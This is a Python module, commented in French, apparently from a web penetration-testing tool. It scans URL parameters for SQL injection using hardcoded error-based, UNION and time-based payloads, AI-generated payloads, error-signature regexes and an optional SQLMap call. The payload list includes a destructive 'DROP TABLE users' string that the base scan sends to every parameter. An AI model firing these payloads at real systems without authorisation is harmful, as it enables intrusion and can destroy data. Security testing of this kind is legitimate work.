"""
Scanner d'injection SQL avec intégration SQLMap et génération de payloads par IA
"""

import asyncio
import subprocess
import re
from typing import List, Optional, Dict
from urllib.parse import urlparse, parse_qs, urlencode
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class ScannerSQLInjection:
    """
    Scanner d'injection SQL qui combine:
    - SQLMap pour les tests automatisés
    - Payloads personnalisés générés par IA
    - Tests manuels avancés
    """

    def __init__(self, client_ia, auth_config=None):
        """
        Initialise le scanner SQL
        
        Args:
            client_ia: Client IA pour génération de payloads
            auth_config: Configuration d'authentification (cookies, headers)
        """
        self.client_ia = client_ia
        self.auth_config = auth_config or {}
        self.cookies = self.auth_config.get('cookies', {})
        self.headers = self.auth_config.get('headers', {})
        
        # Payloads de base pour détection rapide
        self.payloads_base = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "admin' -- ",
            "admin' #",
            "' UNION SELECT NULL-- ",
            "' AND 1=1-- ",
            "' AND 1=2-- ",
            "1' ORDER BY 1-- ",
            "1' ORDER BY 100-- ",
            "' WAITFOR DELAY '0:0:5'-- ",
            "' AND SLEEP(5)-- ",
            "' AND pg_sleep(5)-- ",
            "1'; DROP TABLE users-- ",
            "' UNION SELECT @@version-- ",
            "' UNION SELECT user()-- ",
            "' UNION SELECT database()-- ",
        ]
        
        # Indicateurs d'erreur SQL
        self.erreurs_sql = [
            "SQL syntax",
            "mysql_fetch",
            "mysql_num_rows",
            "ORA-[0-9][0-9][0-9][0-9]",
            "PostgreSQL.*ERROR",
            "Warning.*mysql_.*",
            "valid MySQL result",
            "MySqlClient\\.",
            "com\\.mysql\\.jdbc\\.exceptions",
            "SQLServer JDBC Driver",
            "SQLSTATE\\[",
            "DB2 SQL error",
            "SQLite/JDBCDriver",
            "Microsoft SQL Native Client error",
            "Unclosed quotation mark",
            "syntax error.*near",
        ]
        
        logger.info("Scanner SQL Injection initialisé")

    async def scanner(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> List[Vulnerabilite]:
        """
        Scan complet d'injection SQL
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités SQL trouvées
        """
        vulnerabilites = []
        
        try:
            logger.info(f"🔍 Scan SQL Injection: {url}")
            
            # ⭐ AMÉLIORATION: Tous les tests sont exécutés pour être exhaustif
            # 1. Détection rapide avec payloads de base (utilise paramètres découverts si fournis)
            vuln_rapide = await self._detection_rapide(url, parametres_decouverts)
            if vuln_rapide:
                vulnerabilites.extend(vuln_rapide)
            
            # 2. Tests avec payloads générés par IA (même si timeout, on continue)
            vuln_ia = await self._tests_avec_ia(url, parametres_decouverts)
            if vuln_ia:
                vulnerabilites.extend(vuln_ia)
            
            # 3. Tests temporels (importants pour SQLi aveugles)
            vuln_temporel = await self._tests_temporels(url, parametres_decouverts)
            if vuln_temporel:
                vulnerabilites.append(vuln_temporel)
            
            # 4. Tests UNION (détection de colonnes)
            vuln_union = await self._tests_union(url, parametres_decouverts)
            if vuln_union:
                vulnerabilites.append(vuln_union)
            
            # 5. Détection d'error disclosure
            vuln_error = await self._detecter_error_disclosure(url, parametres_decouverts)
            if vuln_error:
                vulnerabilites.append(vuln_error)
            
            # 6. Intégration SQLMap (optionnel, plus long)
            # vuln_sqlmap = await self._executer_sqlmap(url)
            # if vuln_sqlmap:
            #     vulnerabilites.append(vuln_sqlmap)
            
            if vulnerabilites:
                logger.success(f"✅ {len(vulnerabilites)} injection(s) SQL détectée(s)")
            
            return vulnerabilites
            
        except Exception as e:
            logger.error(f"Erreur scan SQL: {str(e)}")
            return []

    async def _detection_rapide(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> List[Vulnerabilite]:
        """
        Détection rapide avec payloads de base
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        # Extraire les paramètres
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # ⭐ NOUVEAU: Utiliser les paramètres découverts automatiquement
        if parametres_decouverts and parametres_decouverts.get('get'):
            # Combiner paramètres existants et découverts
            params_decouverts = {p: ['1'] for p in parametres_decouverts['get']}
            params = {**params_decouverts, **params}  # Priorité aux paramètres existants
        
        if not params:
            # ⭐ AMÉLIORATION: Liste étendue de paramètres courants pour testphp.vulnweb.com
            params = {
                'id': ['1'],
                'cat': ['1'],
                'category': ['1'],
                'product': ['1'],
                'item': ['1'],
                'artist': ['1'],  # Pour artists.php
                'search': ['test'],  # Pour search.php
                'q': ['test'],  # Pour search.php
                'test': ['test'],  # Pour search.php
            }
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            # ⭐ AMÉLIORATION: Tester TOUS les paramètres découverts (pas de limite)
            for param_name in params.keys():
                # ⭐ AMÉLIORATION: Tester TOUS les payloads de base (pas de limite)
                for payload in self.payloads_base:
                    try:
                        # Créer la requête avec le payload
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        
                        async with session.get(
                            test_url,
                            params=test_params,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            contenu = await response.text()
                            
                            # Vérifier les erreurs SQL
                            for pattern_erreur in self.erreurs_sql:
                                if re.search(pattern_erreur, contenu, re.IGNORECASE):
                                    vuln = Vulnerabilite(
                                        type="Injection SQL",
                                        severite="CRITIQUE",
                                        url=url,
                                        description=f"Injection SQL détectée dans le paramètre '{param_name}'",
                                        payload=payload,
                                        preuve=self._extraire_preuve(contenu, pattern_erreur),
                                        cvss_score=9.8,
                                        remediation="Utiliser des requêtes préparées (prepared statements) et valider toutes les entrées utilisateur"
                                    )
                                    vulnerabilites.append(vuln)
                                    logger.warning(f"⚠️  SQLi trouvé avec payload: {payload[:50]}")
                                    break
                        
                        # Petit délai entre les requêtes
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        logger.debug(f"Erreur test payload: {str(e)}")
                        continue
        
        return vulnerabilites

    async def _tests_avec_ia(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> List[Vulnerabilite]:
        """
        Tests avec payloads générés par l'IA
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        # Vérifier si l'IA est disponible
        if not self.client_ia or not self.client_ia.disponible:
            logger.debug("IA non disponible - Tests IA ignorés")
            return []
        
        # Détecter le type de SGBD potentiel
        dbms = await self._detecter_dbms(url)
        
        # Générer des payloads personnalisés avec l'IA
        payloads_ia = await self.client_ia.generer_payloads_sqli(
            contexte="GET parameter",
            dbms=dbms,
            filtres=None
        )
        
        if not payloads_ia:
            logger.debug("Aucun payload IA généré")
            return []
        
        logger.info(f"Test de {len(payloads_ia)} payloads générés par IA")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # ⭐ NOUVEAU: Utiliser les paramètres découverts
        if parametres_decouverts and parametres_decouverts.get('get'):
            params_decouverts = {p: ['1'] for p in parametres_decouverts['get']}
            params = {**params_decouverts, **params}
        
        if not params:
            params = {'id': ['1']}
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            # ⭐ AMÉLIORATION: Tester encore plus de paramètres et payloads
            for param_name in list(params.keys())[:15]:  # Augmenté de 10 à 15 paramètres
                for payload in payloads_ia[:30]:  # Augmenté de 20 à 30 payloads
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        
                        async with session.get(
                            test_url,
                            params=test_params,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            contenu = await response.text()
                            
                            # Vérifier les erreurs SQL
                            for pattern_erreur in self.erreurs_sql:
                                if re.search(pattern_erreur, contenu, re.IGNORECASE):
                                    vuln = Vulnerabilite(
                                        type="Injection SQL",
                                        severite="CRITIQUE",
                                        url=url,
                                        description=f"Injection SQL (IA) détectée dans '{param_name}'",
                                        payload=payload,
                                        preuve=self._extraire_preuve(contenu, pattern_erreur),
                                        cvss_score=9.8,
                                        remediation="Utiliser des requêtes préparées et valider les entrées"
                                    )
                                    vulnerabilites.append(vuln)
                                    logger.success(f"🎯 SQLi trouvé avec payload IA")
                                    break
                        
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        continue
        
        return vulnerabilites

    async def _tests_temporels(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> Optional[Vulnerabilite]:
        """
        ⭐ PHASE 2: Tests d'injection SQL temporelle (blind SQL injection) - amélioré
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            Vulnerabilite: Vulnérabilité si trouvée
        """
        try:
            # ⭐ PHASE 2: Payloads temporels étendus avec plus de variations
            payloads_temporels = [
                # MySQL/MariaDB
                "' AND SLEEP(5)-- ",
                "' AND SLEEP(10)-- ",  # ⭐ NOUVEAU: Délai plus long pour confirmation
                "1' AND SLEEP(5) AND '1'='1",
                "' UNION SELECT SLEEP(5)-- ",
                # SQL Server
                "' WAITFOR DELAY '0:0:5'-- ",
                "' WAITFOR DELAY '0:0:10'-- ",  # ⭐ NOUVEAU
                "'; WAITFOR DELAY '0:0:5'-- ",
                # PostgreSQL
                "' AND pg_sleep(5)-- ",
                "' AND pg_sleep(10)-- ",  # ⭐ NOUVEAU
                # Oracle
                "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- ",
                # SQLite
                "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name LIKE 'a%' AND randomblob(5000000))-- ",
            ]
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # ⭐ NOUVEAU: Utiliser les paramètres découverts
            if parametres_decouverts and parametres_decouverts.get('get'):
                params_decouverts = {p: ['1'] for p in parametres_decouverts['get']}
                params = {**params_decouverts, **params}
            
            if not params:
                params = {'id': ['1']}
            
            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                # ⭐ PHASE 2: Mesurer le temps de réponse normal (moyenne sur 3 requêtes)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                import time
                temps_normaux = []
                for _ in range(3):  # ⭐ NOUVEAU: 3 mesures pour moyenne
                    debut = time.time()
                    try:
                        await session.get(test_url, params=params, timeout=aiohttp.ClientTimeout(total=10))
                        temps_normaux.append(time.time() - debut)
                    except:
                        pass
                    await asyncio.sleep(0.2)
                
                temps_normal = sum(temps_normaux) / len(temps_normaux) if temps_normaux else 1.0
                
                # ⭐ PHASE 2: Tester plus de paramètres (jusqu'à 10 au lieu de 5)
                for param_name in list(params.keys())[:10]:
                    for payload in payloads_temporels:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        debut = time.time()
                        try:
                            # ⭐ NOUVEAU: Timeout augmenté pour SLEEP(10)
                            timeout_sec = 20 if 'SLEEP(10)' in payload or '0:0:10' in payload else 15
                            await session.get(
                                test_url,
                                params=test_params,
                                timeout=aiohttp.ClientTimeout(total=timeout_sec)
                            )
                            temps_avec_payload = time.time() - debut
                            
                            # ⭐ PHASE 2: Si le délai est significativement plus long (>3.5s pour être sûr)
                            if temps_avec_payload > (temps_normal + 3.5):
                                logger.success(
                                    f"🎯 Blind SQLi temporelle détectée: "
                                    f"{temps_normal:.2f}s -> {temps_avec_payload:.2f}s"
                                )
                                
                                return Vulnerabilite(
                                    type="Injection SQL",
                                    severite="CRITIQUE",
                                    url=url,
                                    description=f"Injection SQL temporelle (blind) dans '{param_name}'",
                                    payload=payload,
                                    preuve=f"Délai observé: {temps_avec_payload:.2f}s vs normal: {temps_normal:.2f}s",
                                    cvss_score=9.8,
                                    remediation="Utiliser des requêtes préparées et valider les entrées"
                                )
                        
                        except asyncio.TimeoutError:
                            logger.debug("Timeout lors du test temporel")
                            continue
                        
                        await asyncio.sleep(0.5)
        
        except Exception as e:
            logger.debug(f"Erreur tests temporels: {str(e)}")
        
        return None

    async def _tests_union(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> Optional[Vulnerabilite]:
        """
        Tests d'injection UNION
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            Vulnerabilite: Vulnérabilité si trouvée
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # ⭐ NOUVEAU: Utiliser les paramètres découverts
            if parametres_decouverts and parametres_decouverts.get('get'):
                params_decouverts = {p: ['1'] for p in parametres_decouverts['get']}
                params = {**params_decouverts, **params}
            
            if not params:
                params = {'id': ['1']}
            
            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                # ⭐ PHASE 2: Tester plus de paramètres (jusqu'à 10 au lieu de 5)
                for param_name in list(params.keys())[:10]:
                    for nb_cols in range(1, 20):  # ⭐ Augmenté de 15 à 20 colonnes
                        # ⭐ PHASE 2: UNION SELECT avec différentes variations
                        nulls = ",NULL" * nb_cols
                        payloads_union = [
                            f"' UNION SELECT NULL{nulls}-- ",
                            f"1' UNION SELECT NULL{nulls}-- ",  # ⭐ NOUVEAU
                            f"' UNION SELECT 1{nulls}-- ",  # ⭐ NOUVEAU
                            f"1 UNION SELECT NULL{nulls}-- ",  # ⭐ NOUVEAU (sans quote)
                        ]
                        
                        for payload in payloads_union:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            
                            try:
                                async with session.get(
                                    test_url,
                                    params=test_params,
                                    timeout=aiohttp.ClientTimeout(total=10)
                                ) as response:
                                    contenu = await response.text()
                                    
                                    # ⭐ PHASE 2: Si pas d'erreur, on a trouvé le bon nombre de colonnes
                                    erreur_trouvee = False
                                    for pattern_erreur in self.erreurs_sql:
                                        if re.search(pattern_erreur, contenu, re.IGNORECASE):
                                            erreur_trouvee = True
                                            break
                                    
                                    if not erreur_trouvee and response.status == 200:
                                        logger.success(f"🎯 UNION SQLi réussie avec {nb_cols+1} colonnes (paramètre: {param_name})")
                                        
                                        return Vulnerabilite(
                                            type="Injection SQL",
                                            severite="CRITIQUE",
                                            url=url,
                                            description=f"Injection SQL UNION dans '{param_name}' ({nb_cols+1} colonnes)",
                                            payload=payload,
                                            preuve=f"UNION SELECT réussie avec {nb_cols+1} colonnes",
                                            cvss_score=9.8,
                                            remediation="Utiliser des requêtes préparées et valider les entrées"
                                        )
                                
                                await asyncio.sleep(0.1)
                                
                            except Exception as e:
                                continue
                        await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur tests UNION: {str(e)}")
        
        return None

    async def _detecter_dbms(self, url: str) -> Optional[str]:
        """
        Détecte le type de SGBD utilisé
        
        Args:
            url: URL à analyser
            
        Returns:
            str: Type de SGBD (MySQL, PostgreSQL, etc.) ou None
        """
        try:
            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    contenu = await response.text()
                    headers = dict(response.headers)
                    
                    # Recherche d'indices
                    if 'X-Powered-By' in headers:
                        powered_by = headers['X-Powered-By'].lower()
                        if 'mysql' in powered_by:
                            return 'MySQL'
                        if 'postgres' in powered_by:
                            return 'PostgreSQL'
                    
                    # Recherche dans le contenu
                    contenu_lower = contenu.lower()
                    if 'mysql' in contenu_lower:
                        return 'MySQL'
                    if 'postgresql' in contenu_lower or 'postgres' in contenu_lower:
                        return 'PostgreSQL'
                    if 'microsoft sql' in contenu_lower or 'mssql' in contenu_lower:
                        return 'MSSQL'
                    if 'oracle' in contenu_lower:
                        return 'Oracle'
        
        except Exception:
            pass
        
        return None

    def _extraire_preuve(self, contenu: str, pattern: str) -> str:
        """
        Extrait une preuve de l'erreur SQL
        
        Args:
            contenu: Contenu de la réponse
            pattern: Pattern regex trouvé
            
        Returns:
            str: Extrait de preuve
        """
        match = re.search(pattern, contenu, re.IGNORECASE)
        if match:
            # Extraire contexte autour du match
            debut = max(0, match.start() - 100)
            fin = min(len(contenu), match.end() + 100)
            return contenu[debut:fin].strip()
        
        return "Erreur SQL détectée dans la réponse"

    async def _executer_sqlmap(self, url: str) -> Optional[Vulnerabilite]:
        """
        Exécute SQLMap pour une analyse approfondie
        
        Args:
            url: URL à tester
            
        Returns:
            Vulnerabilite: Vulnérabilité si trouvée par SQLMap
        """
        try:
            logger.info("Lancement de SQLMap...")
            
            # Commande SQLMap
            cmd = [
                "python3",
                "/opt/sqlmap/sqlmap.py",
                "-u", url,
                "--batch",
                "--level=1",
                "--risk=1",
                "--threads=3",
                "--timeout=10",
                "--retries=1"
            ]
            
            # Exécuter avec timeout
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=60  # 1 minute max
                )
                
                output = stdout.decode()
                
                # Analyser la sortie de SQLMap
                if "is vulnerable" in output.lower():
                    logger.success("SQLMap a trouvé une injection SQL")
                    
                    return Vulnerabilite(
                        type="Injection SQL",
                        severite="CRITIQUE",
                        url=url,
                        description="Injection SQL confirmée par SQLMap",
                        payload="Voir rapport SQLMap",
                        preuve="SQLMap a confirmé la vulnérabilité",
                        cvss_score=9.8,
                        remediation="Utiliser des requêtes préparées"
                    )
            
            except asyncio.TimeoutError:
                logger.warning("SQLMap timeout")
                process.kill()
        
        except Exception as e:
            logger.debug(f"Erreur SQLMap: {str(e)}")
        
        return None

    async def _detecter_error_disclosure(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> Optional[Vulnerabilite]:
        """
        Détecte la divulgation de messages d'erreur de base de données
        
        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)
            
        Returns:
            Vulnerabilite: Si une divulgation d'erreur est trouvée
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # ⭐ NOUVEAU: Utiliser les paramètres découverts
            if parametres_decouverts and parametres_decouverts.get('get'):
                params_decouverts = {p: ['1'] for p in parametres_decouverts['get']}
                params = {**params_decouverts, **params}
            
            if not params:
                params = {'id': ['1'], 'artist': ['1'], 'cat': ['1']}
            
            # Payload spécifique pour déclencher une erreur
            error_payload = "'"
            
            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                # ⭐ AMÉLIORATION: Tester plus de paramètres (jusqu'à 10 au lieu de 3)
                for param_name in list(params.keys())[:10]:
                    test_params = params.copy()
                    test_params[param_name] = [error_payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    async with session.get(
                        test_url,
                        params=test_params,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        contenu = await response.text()
                        
                        # Chercher des messages d'erreur SQL détaillés
                        for pattern_erreur in self.erreurs_sql:
                            match = re.search(pattern_erreur, contenu, re.IGNORECASE)
                            if match:
                                erreur_trouvee = match.group(0)
                                
                                logger.warning(f"⚠️  Divulgation d'erreur DB trouvée: {erreur_trouvee[:50]}")
                                
                                return Vulnerabilite(
                                    type="Divulgation de messages d'erreur DB",
                                    severite="MOYEN",
                                    url=url,
                                    description=f"Le serveur expose des messages d'erreur de base de données détaillés",
                                    payload=error_payload,
                                    preuve=f"Message d'erreur: {erreur_trouvee[:200]}",
                                    cvss_score=5.3,
                                    remediation="Désactiver l'affichage des erreurs en production et utiliser des messages d'erreur génériques"
                                )
        
        except Exception as e:
            logger.debug(f"Erreur détection error disclosure: {str(e)}")
        
        return None

